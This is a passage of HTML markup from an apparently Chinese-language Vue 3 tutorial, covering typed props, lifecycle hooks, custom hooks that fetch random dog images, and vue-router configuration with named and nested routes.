class="attr">name</span>:string,</span><br><span class="line">    <span class="attr">age</span>:number</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line"><span class="comment">// 定义一个自定义类型Persons</span></span><br><span class="line"><span class="keyword">export</span> type <span class="title class_">Persons</span> = <span class="title class_">Array</span>&lt;<span class="title class_">PersonInter</span>&gt;</span><br></pre></td></tr></table></figure><p><code>App.vue</code>中代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;template&gt;</span><br><span class="line">&lt;Person :list=&quot;persons&quot;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">  </span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;App&quot;&gt;</span><br><span class="line">  import Person from &#x27;./components/Person.vue&#x27;</span><br><span class="line">  import &#123;reactive&#125; from &#x27;vue&#x27;</span><br><span class="line">    import &#123;type Persons&#125; from &#x27;./types&#x27;</span><br><span class="line">  </span><br><span class="line">    let persons = reactive&lt;Persons&gt;([</span><br><span class="line">     &#123;id:&#x27;e98219e12&#x27;,name:&#x27;张三&#x27;,age:18&#125;,</span><br><span class="line">      &#123;id:&#x27;e98219e13&#x27;,name:&#x27;李四&#x27;,age:19&#125;,</span><br><span class="line">       &#123;id:&#x27;e98219e14&#x27;,name:&#x27;王五&#x27;,age:20&#125;</span><br><span class="line">     ])</span><br><span class="line">   &lt;/script&gt;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p><code>Person.vue</code>中代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;person&quot;&gt;</span><br><span class="line"> &lt;ul&gt;</span><br><span class="line">     &lt;li v-for=&quot;item in list&quot; :key=&quot;item.id&quot;&gt;</span><br><span class="line">        &#123;&#123;item.name&#125;&#125;--&#123;&#123;item.age&#125;&#125;</span><br><span class="line">      &lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   &lt;/template&gt;</span><br><span class="line">  </span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">import &#123;defineProps&#125; from &#x27;vue&#x27;</span><br><span class="line">import &#123;type PersonInter&#125; from &#x27;@/types&#x27;</span><br><span class="line">  </span><br><span class="line">  // 第一种写法：仅接收</span><br><span class="line">// const props = defineProps([&#x27;list&#x27;])</span><br><span class="line">  </span><br><span class="line">  // 第二种写法：接收+限制类型</span><br><span class="line">// defineProps&lt;&#123;list:Persons&#125;&gt;()</span><br><span class="line">  </span><br><span class="line">  // 第三种写法：接收+限制类型+指定默认值+限制必要性</span><br><span class="line">let props = withDefaults(defineProps&lt;&#123;list?:Persons&#125;&gt;(),&#123;</span><br><span class="line">     list:()=&gt;[&#123;id:&#x27;asdasg01&#x27;,name:&#x27;小猪佩奇&#x27;,age:18&#125;]</span><br><span class="line">  &#125;)</span><br><span class="line">   console.log(props)</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure></blockquote><h2 id="3-13-【生命周期】">3.13. 【生命周期】</h2><ul><li><p>概念：<code>Vue</code>组件实例在创建时要经历一系列的初始化步骤，在此过程中<code>Vue</code>会在合适的时机，调用特定的函数，从而让开发者有机会在特定阶段运行自己的代码，这些特定的函数统称为：生命周期钩子</p></li><li><p>规律：</p><blockquote><p>生命周期整体分为四个阶段，分别是：<strong>创建、挂载、更新、销毁</strong>，每个阶段都有两个钩子，一前一后。</p></blockquote></li><li><p><code>Vue2</code>的生命周期</p><blockquote><p>创建阶段：<code>beforeCreate</code>、<code>created</code></p><p>挂载阶段：<code>beforeMount</code>、<code>mounted</code></p><p>更新阶段：<code>beforeUpdate</code>、<code>updated</code></p><p>销毁阶段：<code>beforeDestroy</code>、<code>destroyed</code></p></blockquote></li><li><p><code>Vue3</code>的生命周期</p><blockquote><p>创建阶段：<code>setup</code></p><p>挂载阶段：<code>onBeforeMount</code>、<code>onMounted</code></p><p>更新阶段：<code>onBeforeUpdate</code>、<code>onUpdated</code></p><p>卸载阶段：<code>onBeforeUnmount</code>、<code>onUnmounted</code></p></blockquote></li><li><p>常用的钩子：<code>onMounted</code>(挂载完毕)、<code>onUpdated</code>(更新完毕)、<code>onBeforeUnmount</code>(卸载之前)</p></li><li><p>示例代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h2&gt;当前求和为：&#123;&#123; sum &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeSum&quot;&gt;点我sum+1&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- vue3写法 --&gt;</span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123; </span><br><span class="line">    ref, </span><br><span class="line">    onBeforeMount, </span><br><span class="line">    onMounted, </span><br><span class="line">    onBeforeUpdate, </span><br><span class="line">    onUpdated, </span><br><span class="line">    onBeforeUnmount, </span><br><span class="line">    onUnmounted </span><br><span class="line">  &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">  // 数据</span><br><span class="line">  let sum = ref(0)</span><br><span class="line">  // 方法</span><br><span class="line">  function changeSum() &#123;</span><br><span class="line">    sum.value += 1</span><br><span class="line">  &#125;</span><br><span class="line">  console.log(&#x27;setup&#x27;)</span><br><span class="line">  // 生命周期钩子</span><br><span class="line">  onBeforeMount(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;挂载之前&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">  onMounted(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;挂载完毕&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">  onBeforeUpdate(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;更新之前&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">  onUpdated(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;更新完毕&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">  onBeforeUnmount(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;卸载之前&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">  onUnmounted(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;卸载完毕&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="3-14-【自定义hook】">3.14. 【自定义hook】</h2><ul><li><p>什么是<code>hook</code>？—— 本质是一个函数，把<code>setup</code>函数中使用的<code>Composition API</code>进行了封装，类似于<code>vue2.x</code>中的<code>mixin</code>。</p></li><li><p>自定义<code>hook</code>的优势：复用代码, 让<code>setup</code>中的逻辑更清楚易懂。</p></li></ul><p>示例代码：</p><ul><li><p><code>useSum.ts</code>中内容如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;ref,onMounted&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">let</span> sum = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">increment</span> = (<span class="params"></span>)=&gt;&#123;</span><br><span class="line">    sum.<span class="property">value</span> += <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">decrement</span> = (<span class="params"></span>)=&gt;&#123;</span><br><span class="line">    sum.<span class="property">value</span> -= <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">onMounted</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="title function_">increment</span>()</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">//向外部暴露数据</span></span><br><span class="line">  <span class="keyword">return</span> &#123;sum,increment,decrement&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>useDog.ts</code>中内容如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;reactive,onMounted&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> axios,&#123;<span class="title class_">AxiosError</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">let</span> dogList = reactive&lt;string[]&gt;([])</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 方法</span></span><br><span class="line">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getDog</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 发请求</span></span><br><span class="line">      <span class="keyword">let</span> &#123;data&#125; = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;https://dog.ceo/api/breed/pembroke/images/random&#x27;</span>)</span><br><span class="line">      <span class="comment">// 维护数据</span></span><br><span class="line">      dogList.<span class="title function_">push</span>(data.<span class="property">message</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">      <span class="comment">// 处理错误</span></span><br><span class="line">      <span class="keyword">const</span> err = &lt;<span class="title class_">AxiosError</span>&gt;error</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(err.<span class="property">message</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 挂载钩子</span></span><br><span class="line">  <span class="title function_">onMounted</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="title function_">getDog</span>()</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">//向外部暴露数据</span></span><br><span class="line">  <span class="keyword">return</span> &#123;dogList,getDog&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>组件中具体使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h2&gt;当前求和为：&#123;&#123;sum&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;button @click=&quot;increment&quot;&gt;点我+1&lt;/button&gt;</span><br><span class="line">  &lt;button @click=&quot;decrement&quot;&gt;点我-1&lt;/button&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;img v-for=&quot;(u,index) in dogList.urlList&quot; :key=&quot;index&quot; :src=&quot;(u as string)&quot;&gt; </span><br><span class="line">  &lt;span v-show=&quot;dogList.isLoading&quot;&gt;加载中......&lt;/span&gt;&lt;br&gt;</span><br><span class="line">  &lt;button @click=&quot;getDog&quot;&gt;再来一只狗&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">  import &#123;defineComponent&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">  export default defineComponent(&#123;</span><br><span class="line">    name:&#x27;App&#x27;,</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">  import useSum from &#x27;./hooks/useSum&#x27;</span><br><span class="line">  import useDog from &#x27;./hooks/useDog&#x27;</span><br><span class="line"></span><br><span class="line">  let &#123;sum,increment,decrement&#125; = useSum()</span><br><span class="line">  let &#123;dogList,getDog&#125; = useDog()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><hr><h1>4. 路由</h1><h2 id="4-1-【对路由的理解】">4.1. 【对路由的理解】</h2><img src="images/image-20231018144351536.png" alt="image-20231018144351536" style="zoom:20%;border-radius:40px" /> <h2 id="4-2-【基本切换效果】">4.2. 【基本切换效果】</h2><ul><li><p><code>Vue3</code>中要使用<code>vue-router</code>的最新版本，目前是<code>4</code>版本。</p></li><li><p>路由配置文件代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createRouter,createWebHistory&#125; <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Home</span> <span class="keyword">from</span> <span class="string">&#x27;@/pages/Home.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">News</span> <span class="keyword">from</span> <span class="string">&#x27;@/pages/News.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">About</span> <span class="keyword">from</span> <span class="string">&#x27;@/pages/About.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line"><span class="attr">history</span>:<span class="title function_">createWebHistory</span>(),</span><br><span class="line"><span class="attr">routes</span>:[</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:<span class="title class_">Home</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:<span class="title class_">About</span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><code>main.ts</code>代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router/index&#x27;</span></span><br><span class="line">app.<span class="title function_">use</span>(router)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><code>App.vue</code>代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;app&quot;&gt;</span><br><span class="line">    &lt;h2 class=&quot;title&quot;&gt;Vue路由测试&lt;/h2&gt;</span><br><span class="line">    &lt;!-- 导航区 --&gt;</span><br><span class="line">    &lt;div class=&quot;navigate&quot;&gt;</span><br><span class="line">      &lt;RouterLink to=&quot;/home&quot; active-class=&quot;active&quot;&gt;首页&lt;/RouterLink&gt;</span><br><span class="line">      &lt;RouterLink to=&quot;/news&quot; active-class=&quot;active&quot;&gt;新闻&lt;/RouterLink&gt;</span><br><span class="line">      &lt;RouterLink to=&quot;/about&quot; active-class=&quot;active&quot;&gt;关于&lt;/RouterLink&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;!-- 展示区 --&gt;</span><br><span class="line">    &lt;div class=&quot;main-content&quot;&gt;</span><br><span class="line">      &lt;RouterView&gt;&lt;/RouterView&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;App&quot;&gt;</span><br><span class="line">  import &#123;RouterLink,RouterView&#125; from &#x27;vue-router&#x27;  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="4-3-【两个注意点】">4.3. 【两个注意点】</h2><blockquote><ol><li><p>路由组件通常存放在<code>pages</code> 或 <code>views</code>文件夹，一般组件通常存放在<code>components</code>文件夹。</p></li><li><p>通过点击导航，视觉效果上“消失” 了的路由组件，默认是被<strong>卸载</strong>掉的，需要的时候再去<strong>挂载</strong>。</p></li></ol></blockquote><h2 id="4-4-【路由器工作模式】">4.4.【路由器工作模式】</h2><ol><li><p><code>history</code>模式</p><blockquote><p>优点：<code>URL</code>更加美观，不带有<code>#</code>，更接近传统的网站<code>URL</code>。</p><p>缺点：后期项目上线，需要服务端配合处理路径问题，否则刷新会有<code>404</code>错误。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="attr">history</span>:<span class="title function_">createWebHistory</span>(), <span class="comment">//history模式</span></span><br><span class="line">  <span class="comment">/******/</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></blockquote></li><li><p><code>hash</code>模式</p><blockquote><p>优点：兼容性更好，因为不需要服务器端处理路径。</p><p>缺点：<code>URL</code>带有<code>#</code>不太美观，且在<code>SEO</code>优化方面相对较差。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="attr">history</span>:<span class="title function_">createWebHashHistory</span>(), <span class="comment">//hash模式</span></span><br><span class="line">  <span class="comment">/******/</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></blockquote></li></ol><h2 id="4-5-【to的两种写法】">4.5. 【to的两种写法】</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 第一种：to的字符串写法 --&gt;</span><br><span class="line">&lt;router-link active-class=&quot;active&quot; to=&quot;/home&quot;&gt;主页&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 第二种：to的对象写法 --&gt;</span><br><span class="line">&lt;router-link active-class=&quot;active&quot; :to=&quot;&#123;path:&#x27;/home&#x27;&#125;&quot;&gt;Home&lt;/router-link&gt;</span><br></pre></td></tr></table></figure><h2 id="4-6-【命名路由】">4.6. 【命名路由】</h2><p>作用：可以简化路由跳转及传参（后面就讲）。</p><p>给路由规则命名：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">routes</span>:[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;zhuye&#x27;</span>,</span><br><span class="line">    <span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:<span class="title class_">Home</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;xinwen&#x27;</span>,</span><br><span class="line">    <span class="attr">path</span>:<span class="string">&#x27;/news&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:<span class="title class_">News</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;guanyu&#x27;</span>,</span><br><span class="line">    <span class="attr">path</span>:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:<span class="title class_">About</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>跳转路由：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--简化前：需要写完整的路径（to的字符串写法） --&gt;</span><br><span class="line">&lt;router-link to=&quot;/news/detail&quot;&gt;跳转&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--简化后：直接通过名字跳转（to的对象写法配合name属性） --&gt;</span><br><span class="line">&lt;router-link :to=&quot;&#123;name:&#x27;guanyu&#x27;&#125;&quot;&gt;跳转&lt;/router-link&gt;</span><br></pre></td></tr></table></figure><h2 id="4-7-【嵌套路由】">4.7. 【嵌套路由】</h2><ol><li><p>编写<code>News</code>的子路由：<code>Detail.vue</code></p></li><li><p>配置路由规则，使用<code>children</code>配置项：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="attr">history</span>:<span class="title function_">createWebHistory</span>(),</span><br><span class="line"><span class="attr">routes</span>:[</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;zhuye&#x27;</span>,</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:<span class="title class_">Home</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;xinwen&#x27;</span>,</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;/news&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:<span class="title class_">News</span>,</span><br><span class="line"><span class="attr">children</span>:[</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;xiang&#x27;</span>,</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;detail&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:<span class="title class_">Detail</span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;guanyu&#x27;</span>,</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:<span class="title class_">About</span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure></li><li><p>跳转路由（记得要加完整路径）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link to=&quot;/news/detail&quot;&gt;xxxx&lt;/router-link&gt;</span><br><span class="line">&lt;!-- 或 --&gt;</span><br><span class="line">&lt;router-link :to=&quot;&#123;path:&#x27;/news/detail&#x27;&#125;&quot;&gt;xxxx&lt;/router-link&gt;</span><br></pre></td></tr></table></figure></li><li><p>记得去<code>Home</code>组件中预留一个<code>&lt;router-view&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;news&quot;&gt;</span><br><span class="line">    &lt;nav class=&quot;news-list&quot;&gt;</span><br><span class="line">      &lt;RouterLink v-for=&quot;news in newsList&quot; :key=&quot;news.id&quot; :to=&quot;&#123;path:&#x27;/news/detail&#x27;&#125;&quot;&gt;</span><br><span class="line">        &#123;&#123;news.name&#125;&#125;</span><br><span class="line">      &lt;/RouterLink&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line">    &lt;div class=&quot;news-detail&quot;&gt;</span><br><span class="line">      &lt;RouterView/&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="4-8-【路由传参】">4.8. 【路由传参】</h2><h3 id="query参数">query参数</h3><ol><li><p>传递参数</p><figure class="highlight plaintext"><table><tr><td 